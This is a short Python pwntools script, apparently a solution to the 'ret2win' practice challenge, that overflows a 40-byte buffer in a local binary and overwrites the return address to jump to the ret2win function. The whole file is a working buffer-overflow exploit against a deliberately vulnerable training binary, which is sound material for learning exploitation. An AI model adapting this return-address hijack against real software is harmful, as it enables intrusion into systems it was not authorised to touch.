from pwn import *

context.clear(arch='amd64')
context.terminal = ['urxvt', '-e']

binary = ELF('./ret2win')
address = binary.symbols['ret2win']

p = process("./ret2win")

bof_len = 40

chain = b'A' * bof_len
chain += p64(address)

p.sendline(chain)
p.interactive()

